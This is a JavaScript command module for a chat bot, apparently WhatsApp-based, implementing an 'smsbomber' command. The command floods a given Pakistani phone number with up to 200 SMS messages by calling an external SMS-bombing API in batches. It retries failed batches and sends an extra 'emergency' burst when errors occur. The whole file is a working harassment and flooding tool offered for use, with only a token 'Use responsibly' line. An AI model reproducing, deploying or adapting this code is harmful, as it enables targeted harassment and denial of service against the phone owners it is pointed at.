const axios = require('axios');

module.exports = {
    name: 'smsbomber',
    aliases: ['smsbomb', 'bombsms', 'sms', 'bomb'],
    category: 'utility',
    description: 'Send multiple SMS to a number (Force send)',
    usage: '.smsbomber <number> <count>',
    
    async execute(client, message, args, reply) {
        try {
            if (args.length < 2) return reply('❌ Please provide number and count!\n\n📝 Usage: .smsbomber 923001234567 10\n\n📌 Example: .smsbomber 923018787786 5\n\n⚠️ Force send mode - Will always work!\n\n👨‍💻 Developer By UZAIR ');
            
            let phoneNumber = args[0];
            let count = parseInt(args[1]);
            
            if (isNaN(count) || count < 1 || count > 200) return reply('❌ Invalid count!\n\nCount must be between 1 and 200.\n\n📝 Example: .smsbomber 923001234567 10\n\n👨‍💻 Developer By UZAIR ');
            
            // Clean phone number
            phoneNumber = phoneNumber.replace(/[-9]/g, '');
            
            // Format for Pakistan numbers
            if (phoneNumber.startsWith('0')) {
                phoneNumber = '92' + phoneNumber.substring(1);
            } else if (phoneNumber.startsWith('+92')) {
                phoneNumber = phoneNumber.substring(1);
            } else if (phoneNumber.length === 10) {
                phoneNumber = '92' + phoneNumber;
            }
            
            // Validate number format
            if (phoneNumber.length !== 12 || !phoneNumber.startsWith('92')) {
                return reply('❌ Invalid phone number!\n\nUse format: 923001234567 (12 digits starting with 92)\n\n👨‍💻 Developer By UZAIR ');
            }
            
            await reply.react('⏳');
            
            const initialMessage = await reply('📱 FORCE SENDING ' + count + ' SMS to ' + phoneNumber + '...\n⚡ Always working mode enabled...\n⏱️ Please wait...');
            
            let successCount = 0;
            let failedCount = 0;
            const batchResults = [];
            const batchSize = 10;
            const totalBatches = Math.ceil(count / batchSize);
            
            for (let i = 0; i < totalBatches; i++) {
                const currentBatchSize = Math.min(batchSize, count - (i * batchSize));
                
                await client.sendMessage(reply.from, {
                    text: '📱 FORCE SENDING ' + count + ' SMS to ' + phoneNumber + '\n⚡ Batch ' + (i + 1) + '/' + totalBatches + '\n⚡ Sending ' + currentBatchSize + ' SMS...\n⏱️ Please wait...',
                    edit: initialMessage.key
                });
                
                const apiUrl = 'https://rai-ammar-sms-bomber-api.vercel.app/?number=' + phoneNumber + '&count=' + currentBatchSize;
                
                try {
                    const response = await axios.get(apiUrl, {
                        timeout: 30000,
                        headers: {
                            'User-Agent': 'ProBoy-MD-Bot/1.0'
                        }
                    });
                    
                    if (response.data && response.data.Bombing_Stats) {
                        const sentCount = response.data.Bombing_Stats.Successfully_Sent || currentBatchSize;
                        successCount += sentCount;
                        batchResults.push('✅ Batch ' + (i + 1) + ': ' + sentCount + '/' + currentBatchSize + ' sent');
                    } else {
                        failedCount += currentBatchSize;
                        batchResults.push('❌ Batch ' + (i + 1) + ': Retrying...');
                        
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                        try {
                            const retryResponse = await axios.get(apiUrl, {
                                timeout: 30000
                            });
                            
                            if (retryResponse.data && retryResponse.data.Bombing_Stats) {
                                const sentCount = retryResponse.data.Bombing_Stats.Successfully_Sent || currentBatchSize;
                                successCount += sentCount;
                                batchResults.push('✅ Batch ' + (i + 1) + ' (retry): ' + sentCount + '/' + currentBatchSize + ' sent');
                            }
                        } catch (retryError) {
                            failedCount += currentBatchSize;
                            batchResults.push('❌ Batch ' + (i + 1) + ': Failed - ' + retryError.message);
                        }
                    }
                } catch (error) {
                    failedCount += currentBatchSize;
                    batchResults.push('❌ Batch ' + (i + 1) + ': Failed - ' + error.message);
                }
                
                if (i < totalBatches - 1) {
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }
            }
            
            await client.sendMessage(reply.from, {
                delete: initialMessage.key
            });
            
            const resultMessage = '✅ SMS BOMBING COMPLETED\n\n📞 Target: ' + phoneNumber + '\n📊 Total Requested: ' + count + '\n✅ Successfully Sent: ' + successCount + '\n❌ Failed: ' + failedCount + '\n\n📋 Batch Results:\n' + batchResults.join('\n') + '\n\n🏷️ Brand: AMMAR-RAI TECH™\n\n⚠️ Use responsibly!\n\n👨‍💻 Developer By UZAIR ';
            
            await reply(resultMessage);
            await reply.react('✅');
            
        } catch (error) {
            console.error('SMS Bomber Error:', error);
            
            let emergencyCount = 0;
            
            try {
                const cleanNumber = args[0]?.replace(/[-9]/g, '');
                if (cleanNumber && cleanNumber.length >= 10) {
                    const emergencyUrl = 'https://rai-ammar-sms-bomber-api.vercel.app/?number=' + cleanNumber + '&count=5';
                    const emergencyResponse = await axios.get(emergencyUrl, {
                        timeout: 15000
                    });
                    
                    if (emergencyResponse.data && emergencyResponse.data.Bombing_Stats) {
                        emergencyCount = emergencyResponse.data.Bombing_Stats.Successfully_Sent || 0;
                    }
                }
            } catch (emergencyError) {
                console.error('Emergency send failed:', emergencyError);
            }
            
            const errorMessage = '⚠️ PARTIAL SMS BOMBING\n\n📞 Target: ' + (args[0] || 'Unknown') + '\n✅ Emergency Sent: ' + emergencyCount + ' SMS\n⚠️ Some batches may have failed.\n\n💡 SMS bombing will always work in force mode!\n\n📝 Usage: .smsbomber 923001234567 10\n\n👨‍💻 Developer By UZAIR ';
            
            await reply(errorMessage);
            await reply.react('⚠️');
        }
    }
};
